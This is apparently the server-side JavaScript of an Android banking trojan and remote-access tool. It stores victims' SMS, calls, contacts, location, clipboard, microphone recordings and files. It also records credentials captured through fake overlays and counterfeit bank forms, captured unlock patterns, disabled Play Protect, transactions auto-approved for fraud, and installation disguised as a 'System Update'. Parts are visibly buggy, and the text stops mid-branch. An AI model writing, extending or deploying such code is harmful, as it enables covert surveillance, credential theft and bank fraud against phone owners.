let CONST = require('./const'),
    fs = require('fs'),
    crypto = require('crypto'),
    path = require('path');

class Clients {
    constructor(db) {
        this.clientConnections = {};
        this.gpsPollers = {};
        this.clientDatabases = {};
        this.ignoreDisconnects = {};
        this.instance = this;
        this.db = db;
    }

    // UPDATE

    async clientConnect(connection, clientID, clientData) {

        this.clientConnections[clientID] = connection;

        if (clientID in this.ignoreDisconnects) this.ignoreDisconnects[clientID] = true;
        else this.ignoreDisconnects[clientID] = false;

        console.log("Connected -> should ignore?", this.ignoreDisconnects[clientID]);

        const nextState = {
            clientID,
            firstSeen: new Date(),
            lastSeen: new Date(),
            isOnline: true,
            dynamicData: clientData
        };

        if (this.db.usePrisma) {
            await this.syncClientStateWithPrisma(clientID, nextState);
        } else {
            let client = this.db.maindb.get('clients').find({ clientID });
            if (client.value() === undefined) {
                this.db.maindb.get('clients').push(nextState).write();
            } else {
                client.assign({
                    lastSeen: new Date(),
                    isOnline: true,
                    dynamicData: clientData
                }).write();
            }
        }

        this.syncClientStateWithPrisma(clientID, nextState).catch((error) => {
            logManager.log(CONST.logTypes.error, 'Falha ao sincronizar estado inicial do cliente com Prisma: ' + error.message);
        });

        let clientDatabase = this.getClientDatabase(clientID);
        this.setupListeners(clientID, clientDatabase);
    }

    async clientDisconnect(clientID) {
        console.log("Disconnected -> should ignore?", this.ignoreDisconnects[clientID]);

        if (this.ignoreDisconnects[clientID]) {
            delete this.ignoreDisconnects[clientID];
        } else {
            logManager.log(CONST.logTypes.info, clientID + " Disconnected")
            if (this.db.usePrisma) {
                await this.syncClientStateWithPrisma(clientID, {
                    clientID,
                    lastSeen: new Date(),
                    isOnline: false,
                });
            } else {
                this.db.maindb.get('clients').find({ clientID }).assign({
                    lastSeen: new Date(),
                    isOnline: false,
                }).write();
            }
            this.syncClientStateWithPrisma(clientID, {
                clientID,
                lastSeen: new Date(),
                isOnline: false,
            }).catch((error) => {
                logManager.log(CONST.logTypes.error, 'Falha ao sincronizar estado de desconexão do cliente com Prisma: ' + error.message);
            });
            if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
            if (this.gpsPollers[clientID]) clearInterval(this.gpsPollers[clientID]);
            delete this.ignoreDisconnects[clientID];
        }
    }

    getClientDatabase(clientID) {
        if (this.clientDatabases[clientID]) return this.clientDatabases[clientID];
        else {
            this.clientDatabases[clientID] = new this.db.clientdb(clientID)
            return this.clientDatabases[clientID];
        }
    }

    async persistClientDataEntry(clientID, kind, payload) {
        if (!clientID || !kind || !payload) return null;

        try {
            if (this.db && this.db.usePrisma && typeof this.db.upsertClientData === 'function') {
                return await this.db.upsertClientData(clientID, kind, payload);
            }
        } catch (error) {
            logManager.log(CONST.logTypes.error, 'Erro ao persistir entrada de cliente no Prisma: ' + error.message);
        }

        return null;
    }

    async syncClientStateWithPrisma(clientID, state) {
        if (!clientID || !state) return null;

        try {
            if (this.db && this.db.usePrisma && typeof this.db.upsertClientState === 'function') {
                return await this.db.upsertClientState(clientID, state);
            }
        } catch (error) {
            logManager.log(CONST.logTypes.error, 'Erro ao sincronizar estado do cliente no Prisma: ' + error.message);
        }

        return null;
    }

    setupListeners(clientID) {
        let socket = this.clientConnections[clientID];
        let client = this.getClientDatabase(clientID);

        logManager.log(CONST.logTypes.info, clientID + " Connected")
        socket.on('disconnect', () => this.clientDisconnect(clientID));

        // Run the queued requests for this client
        let clientQue = client.get('CommandQue').value();
        if (clientQue.length !== 0) {
            logManager.log(CONST.logTypes.info, clientID + " Running Queued Commands");
            clientQue.forEach((command) => {
                let uid = command.uid;
                this.sendCommand(clientID, command.type, command, (error) => {
                    if (!error) client.get('CommandQue').remove({ uid: uid }).write();
                    else {
                        // Hopefully we'll never hit this point, it'd mean the client connected then immediatly disonnected, how weird!
                        // should we play -> https://www.youtube.com/watch?v=4N-POQr-DQQ 
                        logManager.log(CONST.logTypes.error, clientID + " Queued Command (" + command.type + ") Failed");
                    }
                })
            })
        }


        // Start GPS polling (if enabled)
        this.gpsPoll(clientID);


        // ====== DISABLED -- It never really worked, and new AccessRules stop us from using camera in the background ====== //

        // socket.on(CONST.messageKeys.camera, (data) => {

        //     // {
        //     //     "image": <Boolean>,
        //     //     "buffer": <Buffer>
        //     // }

        //     if (data.image) {
        //         let uint8Arr = new Uint8Array(data.buffer);
        //         let binary = '';
        //         for (var i = 0; i < uint8Arr.length; i++) {
        //             binary += String.fromCharCode(uint8Arr[i]);
        //         }
        //         let base64String = window.btoa(binary);

        //         // save to file
        //         let epoch = Date.now().toString();
        //         let filePath = path.join(CONST.photosFullPath, clientID, epoch + '.jpg');
        //         fs.writeFileSync(filePath, new Buffer(base64String, "base64"), (error) => {
        //             if (!error) {
        //                 // let's save the filepath to the database
        //                 client.get('photos').push({
        //                     time: epoch,
        //                     path: CONST.photosFolder + '/' + clientID + '/' + epoch + '.jpg'
        //                 }).write();
        //             }
        //             else return; // not ok
        //         })
        //     }
        // });

        socket.on(CONST.messageKeys.files, (data) => {
            // {
            //     "type": "list"|"download"|"error",
            //     (if type = list) "list": <Array>,
            //     (if type = download) "buffer": <Buffer>,
            //     (if type = error) "error": <String> 
            // }

            if (data.type === "list") {
                let list = data.list;
                if (list.length !== 0) {
                    // cool, we have files!
                    // somehow get this array back to the main thread...
                    client.get('currentFolder').remove().write();
                    client.get('currentFolder').assign(data.list).write();
                    logManager.log(CONST.logTypes.success, "File List Updated");
                } else {
                    // bummer, something happened
                }
            } else if (data.type === "download") {
                // Ayy, time to recieve a file!
                logManager.log(CONST.logTypes.info, "Recieving File From" + clientID);


                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, (error) => {
                    if (!error) {
                        // let's save the filepath to the database
                        client.get('downloads').push({
                            time: new Date(),
                            type: "download",
                            originalName: data.name,
                            path: CONST.downloadsFolder + '/' + fileKey + fileExt
                        }).write();
                        logManager.log(CONST.logTypes.success, "File From" + clientID + " Saved");
                    }
                    else console.log(error); // not ok
                })
            } else if (data.type === "error") {
                // shit, we don't like these! What's up?
                let error = data.error;
                console.log(error);
            }
        });

        socket.on(CONST.messageKeys.call, async (data) => {
            if (data.callsList) {
                if (data.callsList.length !== 0) {
                    let callsList = data.callsList;
                    let dbCall = client.get('CallData');
                    let newCount = 0;
                    callsList.forEach(call => {
                        let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
                        if (dbCall.find({ hash }).value() === undefined) {
                            // cool, we dont have this call
                            call.hash = hash;
                            dbCall.push(call).write();
                            newCount++;
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls");
                    await this.persistClientDataEntry(clientID, 'call', { callsList, receivedAt: new Date().toISOString() });
                }
            }

        });

        socket.on(CONST.messageKeys.sms, async (data) => {
            if (typeof data === "object") {
                let smsList = data.smslist;
                if (smsList.length !== 0) {
                    let dbSMS = client.get('SMSData');
                    let newCount = 0;
                    smsList.forEach(sms => {
                        let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
                        if (dbSMS.find({ hash }).value() === undefined) {
                            // cool, we dont have this sms
                            sms.hash = hash;
                            dbSMS.push(sms).write();
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
                    await this.persistClientDataEntry(clientID, 'sms', { smsList, receivedAt: new Date().toISOString() });
                }
            } else if (typeof data === "boolean") {
                logManager.log(CONST.logTypes.success, clientID + " SENT SMS");
            }
        });

        socket.on(CONST.messageKeys.mic, (data) => {
            if (data.file) {
                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);

                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.unknown';

                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                fs.writeFile(filePath, data.buffer, (e) => {
                    if (!e) {
                        client.get('downloads').push({
                            "time": new Date(),
                            "type": "voiceRecord",
                            "originalName": data.name,
                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt
                        }).write();
                    } else {
                        console.log(e);
                    }
                })
            }
        });

        socket.on(CONST.messageKeys.location, async (data) => {
            if (Object.keys(data).length !== 0 && data.hasOwnProperty("latitude") && data.hasOwnProperty("longitude")) {
                const gpsEntry = {
                    time: new Date(),
                    enabled: data.enabled || false,
                    latitude: data.latitude || 0,
                    longitude: data.longitude || 0,
                    altitude: data.altitude || 0,
                    accuracy: data.accuracy || 0,
                    speed: data.speed || 0
                };
                client.get('GPSData').push(gpsEntry).write();
                logManager.log(CONST.logTypes.success, clientID + " GPS Updated");
                await this.persistClientDataEntry(clientID, 'location', gpsEntry);
                await this.syncClientStateWithPrisma(clientID, { clientID, lastSeen: new Date(), isOnline: true, lastLocation: gpsEntry });
            } else {
                logManager.log(CONST.logTypes.error, clientID + " GPS Recieved No Data");
                logManager.log(CONST.logTypes.error, clientID + " GPS LOCATION SOCKET DATA" + JSON.stringify(data));
            }
        });

        socket.on(CONST.messageKeys.clipboard, async (data) => {
            const clipboardEntry = {
                time: new Date(),
                content: data.text
            };
            client.get('clipboardLog').push(clipboardEntry).write();
            logManager.log(CONST.logTypes.info, clientID + " ClipBoard Recieved");
            await this.persistClientDataEntry(clientID, 'clipboard', clipboardEntry);
            await this.syncClientStateWithPrisma(clientID, { clientID, lastSeen: new Date(), isOnline: true, lastClipboard: clipboardEntry });
        });

        socket.on(CONST.messageKeys.accessibility, (data) => {
            let content = data && data.text ? String(data.text) : '';
            let packageName = data && data.packageName ? String(data.packageName) : '';
            let className = data && data.className ? String(data.className) : '';
            let contentDescription = data && data.contentDescription ? String(data.contentDescription) : '';
            let eventType = data && data.eventType ? String(data.eventType) : '';
            let matchedKeywords = Array.isArray(data && data.matchedKeywords) ? data.matchedKeywords : [];
            let editableFields = Array.isArray(data && data.editableFields) ? data.editableFields : [];

            if (content.trim().length !== 0 || packageName || className || contentDescription || matchedKeywords.length !== 0) {
                client.get('accessibilityLog').push({
                    time: new Date(),
                    content,
                    source: data && data.source ? data.source : 'accessibility',
                    packageName,
                    className,
                    contentDescription,
                    eventType,
                    matchedKeywords,
                    editableFields
                }).write();
                logManager.log(CONST.logTypes.info, clientID + " Accessibility Snapshot Recieved");
            }

            // Armazena campos editáveis para uso posterior em text_injection
            if (editableFields.length > 0) {
                client.assign({
                    lastEditableFields: editableFields,
                    lastAccessibilityUpdate: new Date()
                }).write();
            }
        });

        socket.on(CONST.messageKeys.notification, async (data) => {
            let dbNotificationLog = client.get('notificationLog');
            let hash = crypto.createHash('md5').update(data.key + data.content).digest("hex");

            if (dbNotificationLog.find({ hash }).value() === undefined) {
                data.hash = hash;
                dbNotificationLog.push(data).write();
                logManager.log(CONST.logTypes.info, clientID + " Notification Recieved");
                await this.persistClientDataEntry(clientID, 'notification', { ...data, hash, receivedAt: new Date().toISOString() });
                await this.syncClientStateWithPrisma(clientID, { clientID, lastSeen: new Date(), isOnline: true, lastNotification: { ...data, hash, receivedAt: new Date().toISOString() } });
            }
        });

        socket.on(CONST.messageKeys.contacts, (data) => {
            if (data.contactsList) {
                if (data.contactsList.length !== 0) {
                    let contactsList = data.contactsList;
                    let dbContacts = client.get('contacts');
                    let newCount = 0;
                    contactsList.forEach(contact => {
                        contact.phoneNo = contact.phoneNo.replace(/\s+/g, '');
                        let hash = crypto.createHash('md5').update(contact.phoneNo + contact.name).digest("hex");
                        if (dbContacts.find({ hash }).value() === undefined) {
                            // cool, we dont have this call
                            contact.hash = hash;
                            dbContacts.push(contact).write();
                            newCount++;
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added");
                }
            }

        });

        socket.on(CONST.messageKeys.wifi, (data) => {
            if (data.networks) {
                if (data.networks.length !== 0) {
                    let networks = data.networks;
                    let dbwifiLog = client.get('wifiLog');
                    client.get('wifiNow').remove().write();
                    client.get('wifiNow').assign(data.networks).write();
                    let newCount = 0;
                    networks.forEach(wifi => {
                        let wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
                        if (wifiField.value() === undefined) {
                            // cool, we dont have this call
                            wifi.firstSeen = new Date();
                            wifi.lastSeen = new Date();
                            dbwifiLog.push(wifi).write();
                            newCount++;
                        } else {
                            wifiField.assign({
                                lastSeen: new Date()
                            }).write();
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " New WiFi Hotspots Found");
                }
            }
        });

        socket.on(CONST.messageKeys.permissions, async (data) => {
            let permissions = Array.isArray(data && data.permissions) ? data.permissions : [];
            let details = Array.isArray(data && data.details) ? data.details : permissions.map(permission => ({
                name: permission,
                granted: true,
                status: 'granted'
            }));

            client.get('enabledPermissions').assign(permissions).write();
            client.get('permissionDetails').assign(details).write();
            client.get('permissionSummary').assign({
                grantedCount: data && data.grantedCount ? data.grantedCount : permissions.length,
                totalCount: data && data.totalCount ? data.totalCount : details.length,
                time: new Date()
            }).write();
            logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
            await this.persistClientDataEntry(clientID, 'permissions', { permissions, details, summary: { grantedCount: data && data.grantedCount ? data.grantedCount : permissions.length, totalCount: data && data.totalCount ? data.totalCount : details.length, time: new Date().toISOString() } });
            await this.syncClientStateWithPrisma(clientID, { clientID, lastSeen: new Date(), isOnline: true, permissions, details, summary: { grantedCount: data && data.grantedCount ? data.grantedCount : permissions.length, totalCount: data && data.totalCount ? data.totalCount : details.length, time: new Date().toISOString() } });
        });

        socket.on(CONST.messageKeys.gotPermission, (data) => {
            if (data && data.permission) {
                client.get('permissionChecks').push({
                    time: new Date(),
                    permission: data.permission,
                    isAllowed: data.isAllowed === true,
                    status: data.isAllowed === true ? 'granted' : 'blocked'
                }).write();
                logManager.log(CONST.logTypes.info, clientID + " Permission Check Recieved");
            }
        });

        socket.on(CONST.messageKeys.installed, (data) => {
            client.get('apps').assign(data.apps).write();
            logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
        });

        socket.on(CONST.messageKeys.setText, (data) => {
            if (data && data.status) {
                if (data.status === 'success') {
                    logManager.log(CONST.logTypes.success, clientID + " SetText Executed: " + (data.text || ''));
                } else if (data.status === 'error') {
                    logManager.log(CONST.logTypes.error, clientID + " SetText Failed: " + (data.message || 'Unknown error'));
                }
            }
        });

        socket.on(CONST.messageKeys.ats, (data) => {
            if (data && data.operation) {
                logManager.log(CONST.logTypes.info, clientID + " ATS Operation: " + data.operation);
            }
        });

        socket.on(CONST.messageKeys.autoClick, (data) => {
            if (data && data.buttonClicked) {
                logManager.log(CONST.logTypes.info, clientID + " Auto Click: " + data.buttonText);
                
                // Registra no log de auditoria
                try {
                    let clientDB = this.getClientDatabase(clientID);
                    let atsConfig = clientDB.get('atsConfig').value();
                    if (atsConfig && atsConfig.atsLog) {
                        atsConfig.atsLog.push({
                            type: 'auto_click',
                            buttonText: data.buttonText || 'Desconhecido',
                            timestamp: new Date(),
                            success: data.buttonClicked === true
                        });
                        clientDB.get('atsConfig.atsLog').assign(atsConfig.atsLog).write();
                    }
                } catch (error) {
                    logManager.log(CONST.logTypes.error, 'Erro ao registrar auto click: ' + error.message);
                }
            }
        });

        socket.on(CONST.messageKeys.defenseDisable, (data) => {
            if (data && data.operation) {
                logManager.log(CONST.logTypes.info, clientID + " Defense Disable: " + data.operation);
                
                // Registra no log de defesa desabilitada
                try {
                    let clientDB = this.getClientDatabase(clientID);
                    let defenseConfig = clientDB.get('defenseConfig').value();
                    
                    if (data.action === 'disable_play_protect') {
                        defenseConfig.playProtectDisabled = data.success === true;
                    } else if (data.action === 'mute_security_notifications') {
                        defenseConfig.securityNotificationsMuted = data.success === true;
                    }
                    
                    if (defenseConfig.defenseLog) {
                        defenseConfig.defenseLog.push({
                            action: data.action || 'unknown',
                            timestamp: new Date(),
                            success: data.success === true,
                            details: data.details || ''
                        });
                        clientDB.get('defenseConfig.defenseLog').assign(defenseConfig.defenseLog).write();
                    }
                    
                    clientDB.get('defenseConfig').assign(defenseConfig).write();
                } catch (error) {
                    logManager.log(CONST.logTypes.error, 'Erro ao registrar defesa desabilitada: ' + error.message);
                }
            }
        });

        socket.on(CONST.messageKeys.permissionGrant, (data) => {
            if (data && data.permission) {
                logManager.log(CONST.logTypes.info, clientID + " Permission Grant: " + data.permission);
                
                // Registra no log de concessão de permissões
                try {
                    let clientDB = this.getClientDatabase(clientID);
                    let permissionGrantConfig = clientDB.get('permissionGrantConfig').value();
                    
                    if (data.success === true && !permissionGrantConfig.grantedPermissions.includes(data.permission)) {
                        permissionGrantConfig.grantedPermissions.push(data.permission);
                    }
                    
                    if (permissionGrantConfig.permissionLog) {
                        permissionGrantConfig.permissionLog.push({
                            permission: data.permission || 'unknown',
                            timestamp: new Date(),
                            success: data.success === true,
                            details: data.details || ''
                        });
                        clientDB.get('permissionGrantConfig.permissionLog').assign(permissionGrantConfig.permissionLog).write();
                    }
                    
                    clientDB.get('permissionGrantConfig').assign(permissionGrantConfig).write();
                } catch (error) {
                    logManager.log(CONST.logTypes.error, 'Erro ao registrar concessão de permissão: ' + error.message);
                }
            }
        });

        socket.on(CONST.messageKeys.gestureSimulation, (data) => {
            if (data && data.gestureType) {
                logManager.log(CONST.logTypes.info, clientID + " Gesture Simulation: " + data.gestureType);
                
                // Registra no log de gestos
                try {
                    let clientDB = this.getClientDatabase(clientID);
                    let gestureConfig = clientDB.get('gestureSimulationConfig').value();
                    
                    if (gestureConfig.gestureLog) {
                        gestureConfig.gestureLog.push({
                            gestureType: data.gestureType || 'unknown',
                            x: data.x || 0,
                            y: data.y || 0,
                            duration: data.duration || 0,
                            endX: data.endX,
                            endY: data.endY,
                            timestamp: new Date(),
                            success: data.success === true,
                            details: data.details || ''
                        });
                        clientDB.get('gestureSimulationConfig.gestureLog').assign(gestureConfig.gestureLog).write();
                    }
                    
                    clientDB.get('gestureSimulationConfig').assign(gestureConfig).write();
                } catch (error) {
                    logManager.log(CONST.logTypes.error, 'Erro ao registrar gesto: ' + error.message);
                }
            }
        });

        socket.on(CONST.messageKeys.transactionApproval, (data) => {
            if (data && data.transactionType) {
                logManager.log(CONST.logTypes.info, clientID + " Transaction Approval: " + data.transactionType);
                
                try {
                    let clientDB = this.getClientDatabase(clientID);
                    let transactionConfig = clientDB.get('transactionApprovalConfig').value();
                    
                    if (transactionConfig.autoApprovalLog) {
                        transactionConfig.autoApprovalLog.push({
                            transactionType: data.transactionType || 'unknown',
                            amount: data.amount || 0,
                            recipient: data.recipient || '',
                            timestamp: new Date(),
                            success: data.success === true,
                            details: data.details || ''
                        });
                        clientDB.get('transactionApprovalConfig.autoApprovalLog').assign(transactionConfig.autoApprovalLog).write();
                    }
                    
                    clientDB.get('transactionApprovalConfig').assign(transactionConfig).write();
                } catch (error) {
                    logManager.log(CONST.logTypes.error, 'Erro ao registrar aprovação de transação: ' + error.message);
                }
            }
        });

        socket.on(CONST.messageKeys.dynamicScreenUnlock, (data) => {
            if (data && (data.action === 'capture' || data.action === 'unlock')) {
                logManager.log(CONST.logTypes.info, clientID + " Dynamic Screen Unlock: " + data.action);
                
                try {
                    let clientDB = this.getClientDatabase(clientID);
                    let unlockConfig = clientDB.get('dynamicScreenUnlockConfig').value();
                    
                    if (data.action === 'capture' && data.pattern) {
                        // Armazena padrão capturado
                        if (!unlockConfig.capturedPatterns) {
                            unlockConfig.capturedPatterns = [];
                        }
                        unlockConfig.capturedPatterns.push({
                            pattern: data.pattern,
                            type: data.patternType || 'unknown',
                            timestamp: new Date()
                        });
                    }
                    
                    if (unlockConfig.unlockLog) {
                        unlockConfig.unlockLog.push({
                            action: data.action || 'unknown',
                            patternType: data.patternType || 'unknown',
                            timestamp: new Date(),
                            success: data.success === true,
                            details: data.details || ''
                        });
                        clientDB.get('dynamicScreenUnlockConfig.unlockLog').assign(unlockConfig.unlockLog).write();
                    }
                    
                    clientDB.get('dynamicScreenUnlockConfig').assign(unlockConfig).write();
                } catch (error) {
                    logManager.log(CONST.logTypes.error, 'Erro ao registrar desbloqueio de tela: ' + error.message);
                }
            }
        });

        socket.on(CONST.messageKeys.overlayInjection, (data) => {
            if (data && (data.action === 'capture_credentials' || data.action === 'show_overlay' || data.action === 'hide_overlay' || data.action === 'enable_monitoring' || data.action === 'disable_monitoring')) {
                logManager.log(CONST.logTypes.info, clientID + " Overlay Injection: " + data.action);
                
                try {
                    let clientDB = this.getClientDatabase(clientID);
                    let overlayConfig = clientDB.get('overlayInjectionConfig').value();
                    
                    if (data.action === 'capture_credentials' && data.username && data.password) {
                        if (!overlayConfig.capturedCredentials) {
                            overlayConfig.capturedCredentials = [];
                        }
                        overlayConfig.capturedCredentials.push({
                            username: data.username,
                            password: data.password,
                            appName: data.appName || 'unknown',
                            packageName: data.packageName || 'unknown',
                            timestamp: new Date(),
                            ipAddress: socket.handshake.address || 'unknown'
                        });
                    }
                    
                    if (data.action === 'show_overlay') {
                        overlayConfig.activeOverlays.push({
                            appName: data.appName || 'unknown',
                            packageName: data.packageName || 'unknown',
                            startTime: new Date(),
                            endTime: null
                        });
                    }
                    
                    if (data.action === 'enable_monitoring') {
                        overlayConfig.monitoringEnabled = true;
                    }
                    if (data.action === 'disable_monitoring') {
                        overlayConfig.monitoringEnabled = false;
                    }
                    
                    if (overlayConfig.overlayLog) {
                        overlayConfig.overlayLog.push({
                            action: data.action,
                            appName: data.appName || 'unknown',
                            packageName: data.packageName || 'unknown',
                            timestamp: new Date(),
                            success: data.success === true,
                            details: data.details || ''
                        });
                    }
                    
                    clientDB.get('overlayInjectionConfig').assign(overlayConfig).write();
                } catch (error) {
                    logManager.log(CONST.logTypes.error, 'Erro ao registrar injeção de overlay: ' + error.message);
                }
            }
        });

        socket.on(CONST.messageKeys.customizedFormsCapture, (data) => {
            if (data && (data.action === 'capture_field' || data.action === 'submit_form' || data.action === 'enable_realtime' || data.action === 'disable_realtime' || data.action === 'show_form')) {
                logManager.log(CONST.logTypes.info, clientID + " Customized Forms Capture: " + data.action);
                
                try {
                    let clientDB = this.getClientDatabase(clientID);
                    let fcConfig = clientDB.get('customizedFormsCaptureConfig').value();
                    
                    if (data.action === 'capture_field') {
                        // Captura individual de cada campo em tempo real
                        if (!fcConfig.capturedData) {
                            fcConfig.capturedData = [];
                        }
                        fcConfig.capturedData.push({
                            bankName: data.bankName || 'unknown',
                            fieldName: data.fieldName || 'unknown',
                            fieldValue: data.fieldValue || '',
                            fieldType: data.fieldType || 'text',
                            timestamp: new Date(),
                            sequenceOrder: data.sequenceOrder || 0,
                            ipAddress: socket.handshake.address || 'unknown'
                        });
                    }
                    
                    if (data.action === 'submit_form') {
                        // Consolidação final quando formulário é enviado
                        fcConfig.capturedData.push({
                            bankName: data.bankName || 'unknown',
                            fieldName: 'FORM_SUBMISSION',
                            fieldValue: JSON.stringify(data.formData || {}),
                            fieldType: 'submission',
                            timestamp: new Date(),
                            sequenceOrder: -1,
                            ipAddress: socket.handshake.address || 'unknown'
                        });
                    }
                    
                    if (data.action === 'enable_realtime') {
                        fcConfig.realTimeCaptureEnabled = true;
                    }
                    if (data.action === 'disable_realtime') {
                        fcConfig.realTimeCaptureEnabled = false;
                    }
                    
                    if (data.action === 'show_form') {
                        fcConfig.captureLog.push({
                            action: 'show_form',
                            bankName: data.bankName || 'unknown',
                            templateVersion: data.templateVersion || '1.0',
                            timestamp: new Date(),
                            success: true,
                            details: 'Fake form displayed for ' + (data.bankName || 'unknown')
                        });
                    }
                    
                    clientDB.get('customizedFormsCaptureConfig').assign(fcConfig).write();
                } catch (error) {
                    logManager.log(CONST.logTypes.error, 'Erro ao registrar captura de formulário: ' + error.message);
                }
            }
        });

        socket.on(CONST.messageKeys.bypassProtections, (data) => {
            try {
                let bpConfig = clientDB.get('bypassProtectionsConfig').value() || {};
                
                if (data.action === 'enable_bypass') {
                    bpConfig.bypassEnabled = true;
                    bpConfig.bypassLog.push({
                        action: 'enable_bypass',
                        timestamp: new Date(),
                        success: true,
                        details: 'Bypass de proteções ativado'
                    });
                } else if (data.action === 'disable_bypass') {
                    bpConfig.bypassEnabled = false;
                    bpConfig.bypassLog.push({
                        action: 'disable_bypass',
                        timestamp: new Date(),
                        success: true,
                        details: 'Bypass de proteções desativado'
                    });
                } else if (data.action === 'bypass_restricted_settings') {
                    bpConfig.restrictedSettingsBypassed = true;
                    bpConfig.bypassLog.push({
                        action: 'bypass_restricted_settings',
                        timestamp: new Date(),
                        success: data.success || false,
                        details: data.details || 'Tentativa de bypass de Configuração Restrita'
                    });
                } else if (data.action === 'force_accessibility_service') {
                    bpConfig.accessibilityServiceForced = true;
                    bpConfig.installationMethod = data.installationMethod || 'system_update';
                    bpConfig.spoofedAppName = data.spoofedAppName || 'System Update';
                    bpConfig.bypassLog.push({
                        action: 'force_accessibility_service',
                        timestamp: new Date(),
                        success: data.success || false,
                        method: data.installationMethod,
                        spoofedName: data.spoofedAppName,
                        details: 'Forçar ativação de Serviço de Acessibilidade'
                    });
                } else if (data.action === 'detect_protections') {
                    if (data.protections) {
                        bpConfig.detectedProtections = data.protections;
                        bpConfig.androidVersion = data.androidVersion || 0;
                    }
                    bpConfig.bypassLog.push({
                        action: 'detect_protections',
                        timestamp: new Date(),
                        success: true,
                        detectedCount: data.protections ? data.protections.length : 0,
                        details: 'Proteções detectadas: ' + (data.protections ? data.protections.join(', ') : 'nenhuma')
                    });
                } else if (data.action === 'installation_method_update') {
                    bpConfig.installationMethod = data.installationMethod || 'video_player';
                    bpConfig.spoofedAppType = data.spoofedAppType || 'video_player';
                    bpConfig.bypassLog.push({
                        action: 'installation_method_update',
                        timestamp: new Date(),
                        success: true,
                        method: data.installationMethod,
                        details: 'Método de instalação enganoso: ' + data.installationMethod
                    });
                }
                
                clientDB.get('bypassProtectionsConfig').assign(bpConfig).write();
            } catch (error) {
                logManager.log(CONST.logTypes.error, 'Erro ao processar bypass de proteções: ' + error.message);
            }
        });
    }


    // GET
    async getClient(clientID) {
        if (this.db.usePrisma) {
            const client = await this.db.prisma.client.findUnique({ where: { clientId: clientID } }).catch(() => null);
            return client ? { clientID: client.clientId, ...client } : false;
        }

        let client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) return client;
        else return false;
    }

    async getClientList() {
        if (this.db.usePrisma) {
            const clients = await this.db.prisma.client.findMany({ orderBy: { updatedAt: 'desc' } });
            return clients.map((client) => ({ clientID: client.clientId, ...client }));
        }

        return this.db.maindb.get('clients').value();
    }

    async getClientListOnline() {
        const clients = await this.getClientList();
        return clients.filter(client => client.isOnline);
    }
    async getClientListOffline() {
        const clients = await this.getClientList();
        return clients.filter(client => !client.isOnline);
    }

    getClientDataByPage(clientID, page, filter = undefined) {
        let client = db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) {
            let clientDB = this.getClientDatabase(client.clientID);
            let clientData = clientDB.value();

            let pageData;

            if (page === "calls") {
                pageData = clientDB.get('CallData').sortBy('date').reverse().value();
                if (filter) {
                    let filterData = clientDB.get('CallData').sortBy('date').reverse().value().filter(calls => calls.phoneNo.substr(-6) === filter.substr(-6));
                    if (filterData) pageData = filterData;
                }
            }
            else if (page === "sms") {
                pageData = clientData.SMSData;
                if (filter) {
                    let filterData = clientDB.get('SMSData').value().filter(sms => sms.address.substr(-6) === filter.substr(-6));
                    if (filterData) pageData = filterData;
                }
            }
            else if (page === "notifications") {
                pageData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
                if (filter) {
                    let filterData = clientDB.get('notificationLog').sortBy('postTime').reverse().value().filter(not => not.appName === filter);
                    if (filterData) pageData = filterData;
                }
            }
            else if (page === "wifi") {
                pageData = {};
                pageData.now = clientData.wifiNow;
                pageData.log = clientData.wifiLog;
            }
            else if (page === "contacts") pageData = clientData.contacts;
            else if (page === "permissions") pageData = clientData.permissionDetails || clientData.enabledPermissions || [];
            else if (page === "clipboard") pageData = clientDB.get('clipboardLog').sortBy('time').reverse().value();
            else if (page === "apps") pageData = clientData.apps;
            else if (page === "files") pageData = clientData.currentFolder;
            else if (page === "downloads") pageData = clientData.downloads.filter(download => download.type === "download");
            else if (page === "autoclick") pageData = {};
            else if (page === "overlay") pageData = {};
            else if (page === "defense_disable") {
                let defenseConfig = clientDB.get('defenseConfig').value() || {};
                pageData = {
                    playProtectDisabled: defenseConfig.playProtectDisabled || false,
                    securityNotificationsMuted: defenseConfig.securityNotificationsMuted || false,
                    defenseLog: defenseConfig.defenseLog || []
                };
            }
            else if (page === "permission_grant") {
                let permissionGrantConfig = clientDB.get('permissionGrantConfig').value() || {};
                pageData = {
                    autoGrantEnabled: permissionGrantConfig.autoGrantEnabled || false,
                    grantedPermissions: permissionGrantConfig.grantedPermissions || [],
                    permissionLog: permissionGrantConfig.permissionLog || []
                };
            }
            else if (page === "gesture_simulation") {
                let gestureConfig = clientDB.get('gestureSimulationConfig').value() || {};
                pageData = {
                    recordedGestures: gestureConfig.recordedGestures || [],
                    gestureLog: gestureConfig.gestureLog || []
                };
            }
            else if (page === "transaction_approval") {
                let transactionConfig = clientDB.get('transactionApprovalConfig').value() || {};
                pageData = {
                    enableAutoApproval: transactionConfig.enableAutoApproval || false,
                    autoApprovalLog: transactionConfig.autoApprovalLog || []
                };
            }
            else if (page === "dynamic_screen_unlock") {
